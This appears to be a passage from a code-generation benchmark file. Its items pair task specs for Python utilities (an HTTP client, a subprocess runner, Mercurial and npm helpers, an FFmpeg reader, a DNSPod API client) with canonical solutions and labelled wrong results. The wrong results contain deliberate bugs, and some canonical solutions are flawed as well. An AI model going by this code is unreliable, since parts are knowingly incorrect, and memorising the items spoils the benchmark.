  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a robust HTTP client class in Python that handles both HTTP and HTTPS connections, supports proxy configuration, and manages connection timeouts and keep-alive settings.\n\nClass Description: The MNSHttp class provides a wrapper around Python's http.client module to handle HTTP/HTTPS requests with additional features like proxy support, connection timeout management, and keep-alive functionality.\n\nAttributes:\n- host: str - The target server hostname or IP address\n- is_https: bool - Flag indicating whether to use HTTPS (True) or HTTP (False)\n- connection_timeout: int - Connection timeout in seconds (default: 60)\n- keep_alive: bool - Flag for maintaining persistent connections (default: True)\n- request_size: int - Tracks the size of the last request sent\n- response_size: int - Tracks the size of the last response received\n- logger: Logger - Optional logger for debugging information\n- proxy: str - Optional proxy server configuration\n- conn: HTTPConnection/HTTPSConnection - The active connection object\n\nMethods:\n- __init__(host, connection_timeout=60, keep_alive=True, logger=None, is_https=False) -> None - Initializes the HTTP client with connection parameters\n- _new_conn() -> HTTPConnection/HTTPSConnection - Creates a new connection object based on current configuration\n- _basic_auth_str(username, password) -> str - Generates Basic Auth header string\n- get_env_proxy() -> str - Retrieves proxy configuration from environment variables\n- set_connection_timeout(connection_timeout) -> None - Updates the connection timeout and recreates the connection if needed\n- send_request(req_inter) -> ResponseInternal - Sends an HTTP request and returns the response, handling proxy configuration and connection management\n\nHelper Classes:\n- MNSHTTPConnection(host, port=None, strict=None, connection_timeout=60) - Custom HTTP connection with timeout support and request size tracking\n- MNSHTTPSConnection(host, port=None) - Custom HTTPS connection with request size tracking\n\nBoth connection classes extend their respective http.client counterparts and add:\n- request_length tracking\n- Custom connect() implementation for MNSHTTPConnection with timeout support\n- Overridden send() method to track request size\n- Standardized request() method initialization",
    "Canonical_solution": "import base64\nimport socket\nfrom http.client import HTTPConnection, BadStatusLine, HTTPSConnection\nfrom urllib.parse import urlparse, unquote\nimport os\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = None\n        self.conn = self._new_conn()\n        if self.logger:\n            self.logger.info(\"InitMNSHttp KeepAlive:%s ConnectionTime:%s\" % (self.keep_alive, self.connection_timeout))\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        if isinstance(username, str):\n            username = username.encode()\n        if isinstance(password, str):\n            password = password.encode()\n        return 'Basic ' + base64.b64encode(b':'.join((username, password))).strip().decode()\n\n    def get_env_proxy(self):\n        if self.is_https:\n            return os.getenv('https_proxy') or os.getenv('HTTPS_PROXY')\n        else:\n            return os.getenv('http_proxy') or os.getenv('HTTP_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if not self.is_https:\n            if self.conn:\n                self.conn.close()\n            self.conn = MNSHTTPConnection(self.host, connection_timeout=connection_timeout)\n\n    def send_request(self, req_inter):\n        try:\n            if self.logger:\n                self.logger.debug(\"SendRequest %s\" % req_inter)\n\n            proxy = self.get_env_proxy()\n            if proxy:\n                url = urlparse(proxy)\n                self.conn.close()\n                if url.username:\n                    req_inter.header['Proxy-Authorization'] = self._basic_auth_str(unquote(url.username), unquote(url.password))\n                if self.is_https:\n                    self.conn = MNSHTTPSConnection(url.hostname, url.port)\n                else:\n                    self.conn = MNSHTTPConnection(url.hostname, url.port, connection_timeout=self.connection_timeout)\n                self.conn.set_tunnel(self.host, headers=req_inter.header)\n            else:\n                if self.conn.host != self.host:\n                    self.conn.close()\n                    self.conn = self._new_conn()\n\n            self.conn.request(req_inter.method, 'http://%s%s' % (self.host, req_inter.uri), req_inter.data, req_inter.header)\n            self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            try:\n                http_resp = self.conn.getresponse()\n            except BadStatusLine:\n                self.conn.close()\n                self.conn.request(req_inter.method, req_inter.uri, req_inter.data, req_inter.header)\n                self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n                http_resp = self.conn.getresponse()\n            \n            headers = dict(http_resp.getheaders())\n            resp_inter = ResponseInternal(status=http_resp.status, header=headers, data=http_resp.read())\n            self.request_size = self.conn.request_length\n            self.response_size = len(resp_inter.data)\n            \n            if not self.is_keep_alive():\n                self.conn.close()\n            if self.logger:\n                self.logger.debug(\"GetResponse %s\" % resp_inter)\n            return resp_inter\n        except Exception as e:\n            self.conn.close()\n            raise MNSClientNetworkException(\"NetWorkException\", str(e), req_inter.get_req_id())\n\nclass MNSHTTPConnection(HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        HTTPConnection.__init__(self, host, port, strict)\n        self.request_length = 0\n        self.connection_timeout = connection_timeout\n\n    def send(self, str):\n        HTTPConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPConnection.request(self, method, url, body, headers)\n\n    def connect(self):\n        msg = \"getaddrinfo returns an empty list\"\n        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):\n            af, socktype, proto, canonname, sa = res\n            try:\n                self.sock = socket.socket(af, socktype, proto)\n                self.sock.settimeout(self.connection_timeout)\n                self.sock.connect(sa)\n            except socket.error as msg:\n                if self.sock:\n                    self.sock.close()\n                self.sock = None\n                continue\n            break\n        if not self.sock:\n            raise socket.error(msg)\n\nclass MNSHTTPSConnection(HTTPSConnection):\n    def __init__(self, host, port=None):\n        HTTPSConnection.__init__(self, host, port)\n        self.request_length = 0\n\n    def send(self, str):\n        HTTPSConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPSConnection.request(self, method, url, body, headers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = self.get_env_proxy()\n        self.conn = self._new_conn()\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host)\n\n    def _basic_auth_str(self, username, password):\n        import base64\n        return 'Basic ' + base64.b64encode(f'{username}:{password}'.encode()).decode()\n\n    def get_env_proxy(self):\n        import os\n        proxy = os.environ.get('HTTP_PROXY') or os.environ.get('HTTPS_PROXY')\n        return proxy\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if self.conn:\n            self.conn.settimeout(connection_timeout)\n\n    def send_request(self, req_inter):\n        if self.proxy:\n            import urllib.request\n            proxy = urllib.request.ProxyHandler({self.proxy.split(':')[0]: self.proxy})\n            opener = urllib.request.build_opener(proxy)\n            urllib.request.install_opener(opener)\n        try:\n            if self.is_https:\n                self.conn = MNSHTTPSConnection(self.host)\n            else:\n                self.conn = MNSHTTPConnection(self.host)\n            self.conn.connect()\n            self.conn.send(req_inter)\n            response = self.conn.getresponse()\n            self.request_size = len(req_inter.data)\n            self.response_size = len(response.read())\n            return response\n        except Exception as e:\n            if self.logger:\n                self.logger.error(f\"Request failed: {str(e)}\")\n            return None\n\nclass MNSHTTPConnection(http.client.HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        super().__init__(host, port, strict)\n        self.connection_timeout = connection_timeout\n        self.request_size = 0\n\n    def connect(self):\n        import socket\n        self.sock = socket.create_connection((self.host, self.port), self.connection_timeout)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.settimeout(self.connection_timeout)\n\n    def send(self, data):\n        self.request_size = len(data)\n        super().send(data)\n\nclass MNSHTTPSConnection(http.client.HTTPSConnection):\n    def __init__(self, host, port=None):\n        super().__init__(host, port)\n        self.request_size = 0\n\n    def connect(self):\n        import ssl\n        self.sock = ssl.create_default_context().wrap_socket(\n            socket.create_connection((self.host, self.port)),\n            server_hostname=self.host\n        )\n        self.sock.settimeout(self.connection_timeout)"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Create a Python class that facilitates executing system commands with options for streaming output, sudo execution, and handling both string and list-based commands.\n\nClass Description: The ProcessRunner class provides a flexible way to execute system commands with various configurations. It handles command execution with options for streaming output in real-time, sudo privileges, and supports both string and list-formatted commands. The class manages subprocess creation, output capture, error handling, and return code collection.\n\nAttributes:\n- None (This class doesn't maintain persistent attributes between method calls)\n\nMethods:\n- _read_output(pipe, q) -> None - Private method that continuously reads from a pipe and puts data into a queue for output streaming.\n- _stream_output(comm, shell) -> tuple - Executes a command with streaming output capability, returns (stdout, stderr, returncode).\n- _decode(value) -> str - Helper method to decode byte strings to unicode (Python 3 compatibility).\n- _run_command(comm, shell) -> tuple - Executes a command and returns output after completion, returns (stdout, stderr, returncode).\n- execute(command_list, leave_on_fail) -> tuple/list - Main interface for command execution, handles multiple commands with various options. Returns single result tuple or list of tuples depending on input.\n\nInput Parameters:\n- For execute():\n  - command_list: dict/list - Either a single command dictionary or list of command dictionaries\n  - leave_on_fail: bool - Whether to stop execution if a command fails (default: False)\n- Command dictionary structure:\n  - args: list/str - The command to execute (either as list or string)\n  - shell: bool - Whether to use shell execution (default: False)\n  - stream: bool - Whether to stream output in real-time (default: False)\n  - sudo: bool - Whether to execute with sudo (default: False)\n\nOutput:\n- For single command: tuple (stdout_output, stderr_output, return_code)\n- For multiple commands: list of tuples [(stdout, stderr, returncode), ...]\n- On error: tuple (\"\", \"Command not found!\", 1)",
    "Canonical_solution": "import sys\nimport subprocess\nimport threading\nimport shlex\ntry:\n    from Queue import Queue, Empty\nexcept:\n    from queue import Queue, Empty\n\nON_POSIX = 'posix' in sys.builtin_module_names\n\nclass ProcessRunner:\n    def __init__(self):\n        pass\n\n    def _read_output(self, pipe, q):\n        try:\n            for line in iter(lambda: pipe.read(1), b''):\n                q.put(line)\n        except ValueError:\n            pass\n        pipe.close()\n\n    def _stream_output(self, comm, shell=False):\n        output = error = \"\"\n        p = ot = et = None\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, \n                                bufsize=0, universal_newlines=True, close_fds=ON_POSIX)\n            \n            q = Queue()\n            t = threading.Thread(target=self._read_output, args=(p.stdout, q))\n            t.daemon = True\n            \n            qe = Queue()\n            te = threading.Thread(target=self._read_output, args=(p.stderr, qe))\n            te.daemon = True\n            \n            t.start()\n            te.start()\n\n            while True:\n                c = z = \"\"\n                try:\n                    c = q.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stdout.write(c)\n                    output += c\n                    sys.stdout.flush()\n                try:\n                    z = qe.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stderr.write(z)\n                    error += z\n                    sys.stderr.flush()\n                p.poll()\n                if c==z==\"\" and p.returncode != None:\n                    break\n\n            o, e = p.communicate()\n            return (output+o, error+e, p.returncode)\n        except:\n            if p:\n                return (output, error, p.returncode)\n            return (\"\", \"Command not found!\", 1)\n\n    def _decode(self, value):\n        if sys.version_info >= (3,0) and isinstance(value, bytes):\n            return value.decode(\"utf-8\",\"ignore\")\n        return value\n\n    def _run_command(self, comm, shell=False):\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            c = p.communicate()\n            return (self._decode(c[0]), self._decode(c[1]), p.returncode)\n        except:\n            return (\"\", \"Command not found!\", 1)\n\n    def execute(self, command_list, leave_on_fail=False):\n        if type(command_list) is dict:\n            command_list = [command_list]\n        output_list = []\n        for comm in command_list:\n            args = comm.get(\"args\", [])\n            shell = comm.get(\"shell\", False)\n            stream = comm.get(\"stream\", False)\n            sudo = comm.get(\"sudo\", False)\n            \n            if not len(args):\n                continue\n                \n            if sudo:\n                out = self._run_command([\"which\", \"sudo\"])\n                if \"sudo\" in out[0]:\n                    if type(args) is list:\n                        args.insert(0, out[0].replace(\"\\n\", \"\"))\n                    elif type(args) is str:\n                        args = out[0].replace(\"\\n\", \"\") + \" \" + args\n\n            if stream:\n                out = self._stream_output(args, shell)\n            else:\n                out = self._run_command(args, shell)\n                \n            output_list.append(out)\n            if leave_on_fail and out[2] != 0:\n                break\n                \n        return output_list[0] if len(output_list) == 1 else output_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport queue\nimport threading\nimport shlex\n\nclass ProcessRunner:\n    def _read_output(self, pipe, q):\n        for line in iter(pipe.readline, b''):\n            q.put(self._decode(line))\n        pipe.close()\n\n    def _stream_output(self, comm, shell):\n        stdout_q = queue.Queue()\n        stderr_q = queue.Queue()\n        proc = subprocess.Popen(\n            comm,\n            shell=shell,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True\n        )\n        t_stdout = threading.Thread(target=self._read_output, args=(proc.stdout, stdout_q))\n        t_stderr = threading.Thread(target=self._read_output, args=(proc.stderr, stderr_q))\n        t_stdout.start()\n        t_stderr.start()\n        stdout = []\n        stderr = []\n        while t_stdout.is_alive() or t_stderr.is_alive():\n            if not stdout_q.empty():\n                stdout.append(stdout_q.get())\n            if not stderr_q.empty():\n                stderr.append(stderr_q.get())\n        stdout_str = '\\n'.join(stdout)\n        stderr_str = '\\n'.join(stderr)\n        return_code = proc.poll()\n        return (stdout_str, stderr_str, return_code)\n\n    def _decode(self, value):\n        if isinstance(value, bytes):\n            return value.decode('utf-8')\n        return value\n\n    def _run_command(self, comm, shell):\n        try:\n            return self._stream_output(comm, shell)\n        except Exception as e:\n            return (\"\", f\"Error: {str(e)}\", 1)\n\n    def execute(self, command_list, leave_on_fail=False):\n        if isinstance(command_list, dict):\n            commands = [command_list]\n        else:\n            commands = command_list\n        results = []\n        for cmd in commands:\n            args = cmd.get('args')\n            shell = cmd.get('shell', False)\n            stream = cmd.get('stream', False)\n            sudo = cmd.get('sudo', False)\n            if sudo:\n                args = ['sudo'] + args\n            if isinstance(args, str):\n                args = shlex.split(args)\n            if stream:\n                result = self._run_command(args, shell)\n            else:\n                result = self._run_command(args, shell)\n            results.append(result)\n            if leave_on_fail and result[2] != 0:\n                return result\n        return results"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Implement a set of functions to interact with the Mercurial (hg) version control system to retrieve branch information and repository status using subprocess communication.\n\nFunction Description: The functions use Python's subprocess module to execute Mercurial commands and capture their output through pipes. The functions handle process creation, communication, and output parsing to provide repository information.\n\nInput: None (functions retrieve information directly from the Mercurial repository in the current working directory)\n\nOutput:\n\n_get_hg_branch() -> str - Returns the current Mercurial branch name as a string\n_get_hg_status(output: tuple) -> list - Returns a list of status lines from Mercurial output\nbuild_stats() -> tuple - Returns a tuple containing (status_list, branch_name) or (None, None) if an error occurs",
    "Canonical_solution": "import subprocess\nfrom ..utils import get_subprocess_env\n\ndef _get_hg_branch():\n    p = subprocess.Popen([\"hg\", \"branch\"],\n                         stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE,\n                         env=get_subprocess_env())\n    branch = p.communicate()[0].decode(\"utf-8\").rstrip('\\n')\n    return branch\n\ndef _get_hg_status(output):\n    return output[0].decode(\"utf-8\").splitlines()\n\ndef build_stats():\n    try:\n        p = subprocess.Popen([\"hg\", \"status\"],\n                             stdout=subprocess.PIPE,\n                             stderr=subprocess.PIPE,\n                             env=get_subprocess_env())\n    except OSError:\n        return None, None\n    pdata = p.communicate()\n    if p.returncode != 0:\n        return None, None\n    status = _get_hg_status(pdata)\n    branch = _get_hg_branch()\n    return status, branch",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef _get_hg_branch():\n    try:\n        result = subprocess.run(['hg', 'branch'], capture_output=True, text=True, check=True)\n        return result.stdout.strip()\n    except subprocess.CalledProcessError:\n        return None\n\ndef _get_hg_status(output):\n    try:\n        status_lines = output.splitlines()\n        return [line for line in status_lines if line.strip()]\n    except Exception:\n        return []\n\ndef build_stats():\n    try:\n        branch = _get_hg_branch()\n        if branch is None:\n            return (None, None)\n        status_result = subprocess.run(['hg', 'status'], capture_output=True, text=True, check=True)\n        status_list = _get_hg_status(status_result.stdout)\n        return (status_list, branch)\n    except subprocess.CalledProcessError:\n        return (None, None)"
  },
  {
    "Task_id": 295,
    "Instruction": "Task Description: Create a function that reads audio data from bytes using FFmpeg and converts it into a numpy array with specified sampling rate.\n\nFunction Description: The function `ffmpeg_read` takes raw audio bytes and converts them into a mono audio waveform with a specified sampling rate using FFmpeg. The audio is converted to 32-bit floating-point format. The function handles FFmpeg process creation, data piping, and conversion to numpy array.\n\nInput:\n- `bpayload`: bytes - Raw audio data to be processed\n- `sampling_rate`: int - Target sampling rate for the output audio\n\nOutput:\n- np.array - A numpy array containing the audio waveform in 32-bit floating-point format\n\nNote: The function raises `ValueError` if FFmpeg is not found or if the output audio is malformed.",
    "Canonical_solution": "import subprocess\nimport numpy as np\n\ndef ffmpeg_read(bpayload: bytes, sampling_rate: int) -> np.array:\n    \"\"\"\n    Helper function to read an audio file through ffmpeg.\n    \"\"\"\n    ar = f\"{sampling_rate}\"\n    ac = \"1\"\n    format_for_conversion = \"f32le\"\n    ffmpeg_command = [\n        \"ffmpeg\",\n        \"-i\",\n        \"pipe:0\",\n        \"-ac\",\n        ac,\n        \"-ar\",\n        ar,\n        \"-f\",\n        format_for_conversion,\n        \"-hide_banner\",\n        \"-loglevel\",\n        \"quiet\",\n        \"pipe:1\",\n    ]\n\n    try:\n        ffmpeg_process = subprocess.Popen(ffmpeg_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n    except FileNotFoundError:\n        raise ValueError(\"ffmpeg was not found but is required to load audio files from filename\")\n    output_stream = ffmpeg_process.communicate(bpayload)\n    out_bytes = output_stream[0]\n\n    audio = np.frombuffer(out_bytes, np.float32)\n    if audio.shape[0] == 0:\n        raise ValueError(\"Malformed soundfile\")\n    return audio",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import numpy as np\nimport subprocess\nimport io\n\ndef ffmpeg_read(bpayload, sampling_rate):\n    try:\n        # Create a pipe to FFmpeg\n        process = subprocess.Popen(\n            ['ffmpeg', '-f', 's16le', '-ar', str(sampling_rate), '-i', '-', '-'],\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            universal_newlines=False\n        )\n        \n        # Convert bytes to audio stream\n        audio_data = io.BytesIO(bpayload)\n        \n        # Pipe the audio data to FFmpeg\n        stdout, stderr = process.communicate(input=audio_data.read())\n        \n        if process.returncode != 0:\n            raise ValueError(f\"FFmpeg error: {stderr.decode()}\")\n        \n        # Convert the output to numpy array\n        audio_array = np.frombuffer(stdout, dtype=np.float32)\n        audio_array = audio_array.reshape(-1, 1)\n        \n        return audio_array\n    \n    except FileNotFoundError:\n        raise ValueError(\"FFmpeg not found in the system path.\")\n    except Exception as e:\n        raise ValueError(f\"Audio processing failed: {str(e)}\")"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a function that executes a system command in a subprocess, captures its output and error streams, and handles potential errors appropriately.\n\nFunction Description: The function `run_cmd` executes a given system command as a subprocess, with options for verbose output. It captures both stdout and stderr streams, provides real-time output when in verbose mode, and raises an exception if the command fails (non-zero return code). The function ensures proper process cleanup and returns the command's output and error streams.\n\nInput:\n- command: List[str] - A list of strings representing the command and its arguments to be executed\n- verbose: bool (optional, default=False) - If True, prints real-time output of the command execution\n\nOutput:\n- Returns: Tuple[bytes, bytes] - A tuple containing the stdout and stderr output from the command\n- Raises: Exception - If the command returns a non-zero exit code, includes the return code and output streams in the exception message",
    "Canonical_solution": "import subprocess\nimport sys\n\ndef run_cmd(command, verbose=False):\n    if verbose:\n        print(\"Running command:\", \" \".join(command))\n    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    if verbose:\n        while proc.poll() is None:\n            string = b\"\"\n            for c in iter(lambda: proc.stdout.read(1), string):\n                c = c.decode(\"ascii\")\n                sys.stdout.write(c)\n\n        sys.stdout.flush()\n\n    proc.wait()\n    if proc.returncode != 0:\n        out, err = proc.communicate()\n        raise Exception(\n            \"The training could not be completed (returncode=%i): %s %s\"\n            % (proc.returncode, out, err)\n        )\n\n    out, err = proc.communicate()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef run_cmd(command, verbose=False):\n    process = subprocess.Popen(\n        command,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n    stdout, stderr = b'', b''\n    while True:\n        output = process.stdout.readline()\n        if output == b'':\n            break\n        if verbose:\n            print(output.strip())\n        stdout += output\n    stderr += process.stderr.read()\n    exit_code = process.poll()\n    if exit_code != 0:\n        raise Exception(f\"Command failed with code {exit_code}\\nSTDOUT:\\n{stdout}\\nSTDERR:\\n{stderr}\")\n    return stdout.encode(), stderr.encode()"
  },
  {
    "Task_id": 299,
    "Instruction": "Task Description: Create a Python class that checks the installed version of npm (Node Package Manager) on the system using subprocess communication.\n\nClass Description: The Segment class is designed to retrieve and store the version of npm installed on the system. It uses subprocess.PIPE to communicate with the system process that runs the npm version command.\n\nAttributes:\nversion: [str] - Stores the version of npm retrieved from the system process. Initialized as None and updated after running the version check.\n\nMethods:\nrun: [run]() -> [None] - Executes the npm --version command using subprocess.Popen, captures the output, decodes it, and stores the result in the version attribute. Handles OSError exceptions if the command fails.\nget_version: [get_version]() -> [str] - Returns the stored npm version. Returns None if the version check was not successful or not run.",
    "Canonical_solution": "import subprocess\n\nclass Segment:\n    def __init__(self):\n        self.version = None\n\n    def run(self):\n        try:\n            p1 = subprocess.Popen([\"npm\", \"--version\"], stdout=subprocess.PIPE)\n            self.version = p1.communicate()[0].decode(\"utf-8\").rstrip()\n        except OSError:\n            self.version = None\n\n    def get_version(self):\n        return self.version",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "class Segment:\n    def __init__(self):\n        self.version = None\n\n    def run(self):\n        import subprocess\n        try:\n            result = subprocess.run(['npm', '--version'], capture_output=True, text=True)\n            if result.returncode == 0:\n                self.version = result.stdout.strip()\n            else:\n                self.version = None\n        except OSError:\n            self.version = None\n\n    def get_version(self):\n        return self.version"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a Python class to interact with the DNSPod API for managing DNS records, including querying domain information, listing records, and updating DNS records.\n\nClass Description: DNSPodAPI is a class that provides methods to interact with DNSPod's API for DNS management. It handles authentication, request construction, and response processing for various DNS operations.\n\nAttributes:\n\nSITE: str - The DNSPod API endpoint (dnsapi.cn)\nMETHOD: str - Default HTTP method for requests (POST)\nTOKEN_PARAM: str - Parameter name for authentication token (login_token)\nDEFAULT: str - Default value for record line (\"\u9ed8\u8ba4\")\nLENGTH: str - Parameter name for response length (\"length\")\nID: str - DNSPod API token ID\nTOKEN: str - DNSPod API token key\nPROXY: str - Optional proxy server address\nTTL: int - Time-to-live value for DNS records\ndomain_list: dict - Cache of domain names and their IDs\nrecords: dict - Cache of DNS records organized by domain ID\nrecord_keys: tuple - Valid fields for DNS records\n\nMethods:\n\n__init__(token_id=None, token_key=None, proxy=None, ttl=None) -> None - Initializes the DNSPodAPI instance with authentication tokens and optional proxy/ttl settings.\n\nrequest(action, param=None, **params) -> dict - Makes an authenticated API request to the specified action with given parameters. Returns parsed JSON response or raises an exception on error.\n\nget_domain_info(domain) -> tuple - Splits a domain into its main and subdomain parts, returning the domain ID and subdomain.\n\nget_domain_id(domain) -> str - Retrieves and caches the ID for a given domain name.\n\nget_records(did, **conditions) -> dict - Retrieves DNS records for a domain ID that match given conditions (e.g., name, type).\n\nupdate_record(domain, value, record_type=\"A\") -> dict - Updates or creates a DNS record for the given domain with the specified value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode\nfrom os import environ\n\nclass DNSPodAPI:\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.SITE = \"dnsapi.cn\"\n        self.METHOD = \"POST\"\n        self.TOKEN_PARAM = \"login_token\"\n        self.DEFAULT = \"\u9ed8\u8ba4\"\n        self.LENGTH = \"length\"\n        \n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.domain_list = {}\n        self.records = {}\n        self.record_keys = (\"id\", \"name\", \"type\", \"line\", \"line_id\", \"enabled\", \"mx\", \"value\")\n\n    def request(self, action, param=None, **params):\n        if param:\n            params.update(param)\n        params = {k: v for k, v in params.items() if v is not None}\n        params.update({self.TOKEN_PARAM: \"%s,%s\" % (self.ID, self.TOKEN), 'format': 'json', self.LENGTH: \"3000\"})\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + action, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\",\n            \"User-Agent\": \"DDNS/%s (ddns@newfuture.cc)\" % environ.get(\"DDNS_VERSION\", \"1.0.0\")\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            if not data:\n                raise Exception(\"empty response\")\n            elif data.get(\"status\", {}).get(\"code\") == \"1\":\n                return data\n            else:\n                raise Exception(data.get('status', {}))\n\n    def get_domain_info(self, domain):\n        domain_split = domain.split('.')\n        sub, did = None, None\n        main = domain_split.pop()\n        while domain_split:\n            main = domain_split.pop() + '.' + main\n            did = self.get_domain_id(main)\n            if did:\n                sub = \".\".join(domain_split) or '@'\n                break\n        return did, sub\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n        else:\n            try:\n                info = self.request('Domain.Info', domain=domain)\n                did = info.get(\"domain\", {}).get(\"id\")\n                if did:\n                    self.domain_list[domain] = did\n                    return did\n            except Exception:\n                return None\n\n    def get_records(self, did, **conditions):\n        if did not in self.records:\n            self.records[did] = {}\n            data = self.request('Record.List', domain_id=did)\n            if data:\n                for record in data.get('records'):\n                    self.records[did][record[\"id\"]] = {\n                        k: v for (k, v) in record.items() if k in self.record_keys}\n\n        records = {}\n        for (rid, record) in self.records[did].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[rid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        domainid, sub = self.get_domain_info(domain)\n        if not domainid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(domainid, name=sub, type=record_type)\n        result = {}\n        if records:\n            for (did, record) in records.items():\n                if record[\"value\"] != value:\n                    res = self.request('Record.Modify', \n                                     record_id=did, \n                                     record_line=record[\"line\"].replace(\"Default\", \"default\").encode(\"utf-8\"), \n                                     value=value, \n                                     sub_domain=sub, \n                                     domain_id=domainid, \n                                     record_type=record_type, \n                                     ttl=self.TTL)\n                    if res:\n                        self.records[domainid][did][\"value\"] = value\n                        result[did] = res.get(\"record\")\n                    else:\n                        result[did] = \"update fail!\\n\" + str(res)\n                else:\n                    result[did] = domain\n        else:\n            res = self.request(\"Record.Create\", \n                             domain_id=domainid, \n                             value=value,\n                             sub_domain=sub, \n                             record_type=record_type, \n                             record_line=self.DEFAULT, \n                             ttl=self.TTL)\n            if res:\n                did = res.get(\"record\")[\"id\"]\n                self.records[domainid][did] = res.get(\"record\")\n                self.records[domainid][did].update(\n                    value=value, sub_domain=sub, record_type=record_type)\n                result = res.get(\"record\")\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nimport json\nimport re\n\nclass DNSPodAPI:\n    SITE = \"dnsapi.cn\"\n    METHOD = \"POST\"\n    TOKEN_PARAM = \"login_token\"\n    DEFAULT = \"\u9ed8\u8ba4\"\n    LENGTH = \"length\"\n    ID = \"id\"\n    TOKEN = \"token\"\n    PROXY = \"http://127.0.0.1:7890\"\n    TTL = 300\n    domain_list = {}\n    records = {}\n    record_keys = (\"id\", \"name\", \"type\", \"value\", \"ttl\", \"disabled\", \"line\")\n\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.id = token_id or self.ID\n        self.token = token_key or self.TOKEN\n        self.proxy = proxy or self.PROXY\n        self.ttl = ttl or self.TTL\n\n    def request(self, action, param=None, **params):\n        url = f\"https://{self.SITE}/v1/{action}\"\n        headers = {\"Content-Type\": \"application/json\"}\n        data = {self.TOKEN_PARAM: self.token}\n        if param:\n            data.update(param)\n        data.update(params)\n        proxies = {\"http\": self.proxy, \"https\": self.proxy} if self.proxy else None\n        response = requests.request(self.METHOD, url, headers=headers, json=data, proxies=proxies)\n        if response.status_code != 200:\n            raise Exception(f\"Request failed with status code {response.status_code}: {response.text}\")\n        result = response.json()\n        if result.get(self.LENGTH) == \"success\":\n            return result\n        else:\n            raise Exception(f\"API error: {result.get('message', 'Unknown error')}\")\n\n    def get_domain_info(self, domain):\n        main_domain = re.sub(r'^www\\.', '', 